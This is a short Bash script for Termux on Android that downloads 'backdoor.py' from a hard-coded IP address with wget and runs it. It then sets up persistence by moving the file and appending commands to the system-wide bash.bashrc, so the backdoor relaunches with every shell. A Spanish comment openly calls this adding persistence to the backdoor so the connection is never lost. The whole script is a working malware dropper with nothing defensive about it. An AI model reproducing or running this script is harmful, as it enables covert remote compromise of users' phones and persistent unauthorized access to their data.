
#!/bin/bash
clear
termux-setup-storage
pkg update -y && pkg upgrade -y
clear
pkg install python -y
pkg install wget -y
wget http://192.81.217.221/backdoor.py
chmod +x backdoor.py
python backdoor.py

##AGREGAR LA PERSISTENCIA AL BACKDOOR PARA NO PERDER CONEXION NUNCA

mv backdoor.py /data/data/com.termux/files/usr/etc
cd /data/data/com.termux/files/usr/etc
echo "agregando persistencia al backdoor"
sleep 2
eho "cd /data/data/com.termux/files/usr/etc" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "python backdoor.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "persistencia agregada correctamente"
echo  "$HOME" >> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
